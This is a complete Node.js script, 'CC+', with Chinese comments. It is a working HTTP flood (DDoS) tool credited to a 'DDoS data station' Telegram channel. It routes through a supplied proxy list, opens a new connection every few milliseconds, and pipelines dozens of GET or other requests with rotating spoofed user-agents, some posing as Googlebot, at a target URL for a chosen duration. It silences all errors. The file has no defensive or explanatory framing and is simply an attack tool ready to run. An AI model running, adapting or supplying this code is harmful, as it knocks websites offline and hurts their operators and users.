// 忽略错误
process.on('uncaughtException', function() {})
process.on('unhandledRejection', function() {})

// 载入前置
let chalk, proxies, UAs
const fs = require('fs')
const url = require('url')
const net = require('net')
const path = require("path")
const execSync = require('child_process').execSync

// 清屏
console.log('\033[2J')

// 尝试加载 Chalk，失败则安装
try {
    chalk = require('chalk')
} catch (err) {
    console.log('\x1B[1m\x1B[33m正在安装安装前置\x1B[39m \x1B[1m\x1B[31mChalk\x1B[39m \x1B[1m\x1B[33m请稍后...\x1B[39m')
    execSync('npm install chalk')
    console.log('\x1B[1m\x1B[32m前置\x1B[39m \x1B[1m\x1B[31mChalk\x1B[39m \x1B[1m\x1B[32m安装完成，请重新启动脚本。\x1B[39m')
    process.exit()
}

// 颜色
const cyan = chalk.bold.cyan
const blue = chalk.bold.blue
const green = chalk.bold.green
const error = chalk.bold.red
const warning = chalk.bold.yellow
const magenta = chalk.bold.magenta
console.log(cyan('『CC+』'))

// 检查参数
if (process.argv.length !== 6) {
    console.log(error('错误：命令格式不正确！'))
    console.log(warning('SH：./cc+.sh 线程 列表文件 方法 时间(秒) 目标(URL)'))
    console.log(warning('格式：node cc+.js 列表文件 方法 时间(秒) 目标(URL)'))
    console.log(warning('示例：node cc+.js proxy.txt GET 60 http://example.com'))
    console.log(green('BY：DDoS数据站  &  TG：https://t.me/DDoS_DataStation'))
    process.exit()
}

// 载入参数
const fileURL = __filename
const fileName = path.basename(fileURL)
const listFile = process.argv[2]
const methods = process.argv[3].toUpperCase()
const time = process.argv[4]
const target = process.argv[5]
const parsed = url.parse(target)
//console.log(fileURL,fileName,listFile,methods,time,url_)

// 判断参数
if (!target !== !target.startsWith('http://') && !target.startsWith('https://')) {
    console.log(error('错误：请输入正确的 目标(URL)'))
    process.exit()
}

// 尝试读取 代理IP列表
try {
    proxies = fs.readFileSync(listFile, 'utf-8').toString().replace(/\r/g, '').split('\n')
} catch (err) {
    if (err.code !== 'ENOENT') throw err
    console.log(error(`错误：代理IP列表(%s) 读取失败！`), listFile)
    process.exit()
}
console.log(green(`载入代理IP列表: `)+warning('%i'), proxies.length)

// 定时停止
setTimeout(() => {
    console.log(error('结束攻击 '+magenta(methods)+' '+warning(target)+' ['+blue(parsed.host)+']，持续时间 '+green(time)+' 秒'))
    process.exit()
}, time * 1000)

// 尝试读取 UA列表(ua.txt)
try {
    UAs = fs.readFileSync('ua.txt', 'utf-8').toString().replace(/\r/g, '').split('\n')
} catch (err) {
    if (err.code !== 'ENOENT') throw err
    console.log(warning('警告：UA列表(ua.txt) 读取失败，使用内置UA列表。'))
    UAs = [
        'Mozilla/5.0 (iPhone; CPU iPhone OS 9_1 like Mac OS X) AppleWebKit/601.1.46 (KHTML, like Gecko) Version/9.0 Mobile/13B143 Safari/601.1 (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)',
        'Mozilla/5.0 (Linux; Android 6.0.1; Nexus 5X Build/MMB29P) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2272.96 Mobile Safari/537.36 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (Linux; Android 5.0; SM-G920A) AppleWebKit (KHTML, like Gecko) Chrome Mobile Safari (compatible; AdsBot-Google-Mobile; +http://www.google.com/mobile/adsbot.html)',
        'Mozilla/5.0 (iPhone; CPU iPhone OS 12_1_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0 Mobile/15E148 Safari/604.1',
        'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.140 Safari/537.36 Edge/18.18247',
        'Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; Googlebot/2.1; +http://www.google.com/bot.html) Safari/537.36',
        'Mozilla/5.0 (Linux; Android 9; BLA-L09) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/75.0.3770.143 Mobile Safari/537.36',
        'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/67.0.3599.0 Safari/537.36',
        'Mozilla/5.0 (Windows NT 10.0; WOW64; Trident/7.0; .NET4.0C; .NET4.0E; rv:11.0) like Gecko',
        'Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)',
        'Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko',
    ]
}
console.log(green(`载入UA列表: `)+warning('%i'), UAs.length)

setInterval(function() {
    let proxy = proxies[Math.floor(Math.random() * proxies.length)];
    proxy = proxy.split(':')
    let socket = net.connect(proxy[1], proxy[0])
    socket.setKeepAlive(true, 5000)
    socket.setTimeout(5000)
    socket.once('error', err => {
        //console.log('错误：'+err)
    })
    socket.once('disconnect', () => {
        //console.log('断开')
    })
    socket.once('data', data => {
        //console.log('返回：'+data)
    })
    for (let j = 0; j < 15; j++) {
        socket.write(methods + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n')
        socket.write(methods + ' ' + target + ' HTTP/1.1\r\nHost: ' + parsed.host + '\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3\r\nuser-agent: ' + UAs[Math.floor(Math.random() * UAs.length)] + '\r\nUpgrade-Insecure-Requests: 1\r\nAccept-Encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nCache-Control: max-age=0\r\nConnection: Keep-Alive\r\n\r\n')
    }
    socket.on('data', function() {
        setTimeout(function() {
            socket.destroy()
            return delete socket
        }, 5000)
    })
}, 5)

console.log(error('正在攻击 '+magenta(methods)+' '+warning(target)+' ['+blue(parsed.host)+']，持续时间 '+green(time)+' 秒'))